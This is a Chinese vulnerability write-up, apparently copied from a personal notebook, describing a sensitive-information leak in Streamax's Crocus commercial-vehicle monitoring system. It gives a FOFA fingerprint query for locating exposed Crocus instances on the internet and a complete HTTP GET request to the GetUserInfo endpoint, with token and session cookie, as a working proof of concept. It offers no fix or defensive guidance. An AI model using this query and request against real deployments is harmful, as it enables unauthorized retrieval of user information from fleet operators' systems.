# 深圳市锐明技术股份有限公司Crocus系统存在敏感信息泄露漏洞

# 一、漏洞简介
锐明技术作为一家专注于AI和视频技术的商用车智能物联（AIoT）解决方案提供商，Crocus系统是其核心产品之一。Crocus系统旨在利用人工智能、高清视频、大数据和自动驾驶技术，帮助商用车减少交通事故和货物丢失，提高企业或车队的运营效率。通过车载摄像头、毫米波雷达等传感器，实现对车辆周围环境的实时感知和监控，提高驾驶安全性。利用AI技术，系统能够识别车辆和行人的身份，并分析驾驶员的驾驶行为，及时提醒驾驶员注意潜在风险。Crocus系统能够实时监控货箱状态，包括货物是否丢失、货箱是否关闭等，并通过3D检测技术实现更精准的货物识别和管理。深圳市锐明技术股份有限公司Crocus系统存在敏感信息泄露漏洞

# 二、影响版本
+ Crocus系统

# 三、资产测绘
+ fofa`body="/ThirdResource/respond/respond.min.js" && title="Crocus"`
+ 特征

![1720274332352-c9c6a280-a643-4bac-95f0-0f7942a72149.png](./img/UYZbMZVovOGNg0S7/1720274332352-c9c6a280-a643-4bac-95f0-0f7942a72149-943722.png)

# 四、漏洞复现
```http
GET /Home.do?Action=GetUserInfo&Type=Get&Guid=1724206435273 HTTP/1.1
Host: 
Accept: */*
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Token: d2JzczoxNzI0MjA2NDIwNzU2
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=234DBD0F52D9D798CB9931DEDA75131A; Saffron.U=VUlEPTEmVU49Y3JvY3VzJkdJRD0xNzI0MjA3NDQ5NTI2ODYmUklEPTEmTT1CTWFwJklOUz0x
X-Requested-With: XMLHttpRequest
```

![1725460117888-1de7a21d-cdd9-49fc-99de-2248636c77d1.png](./img/UYZbMZVovOGNg0S7/1725460117888-1de7a21d-cdd9-49fc-99de-2248636c77d1-789831.png)



> 更新: 2024-09-06 02:24:31  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/lr4dgs05xzsvh5l3>